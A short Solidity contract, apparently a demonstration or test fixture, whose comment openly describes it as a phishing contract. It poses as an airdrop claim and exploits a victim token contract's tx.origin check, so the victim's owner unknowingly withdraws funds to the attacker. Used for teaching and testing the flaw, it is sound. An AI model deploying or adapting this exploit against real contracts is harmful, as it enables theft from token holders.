// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

interface IWrappedToken {
  function emergencyWithdraw(address recipient) external;
}

/**
 * @dev Phishing contract: it looks like an innocent airdrop, but when the owner of `victim` calls `claimAirdrop`,
 * it calls `victim.emergencyWithdraw` on their behalf. Inside `victim`, `tx.origin` is the owner,
 * while `msg.sender` is this contract.
 */
contract TxOriginAttacker {
  IWrappedToken public immutable victim;
  address public immutable attacker;

  constructor(IWrappedToken victim_) {
    victim = victim_;
    attacker = msg.sender;
  }

  function claimAirdrop() external {
    victim.emergencyWithdraw(attacker);
  }
}
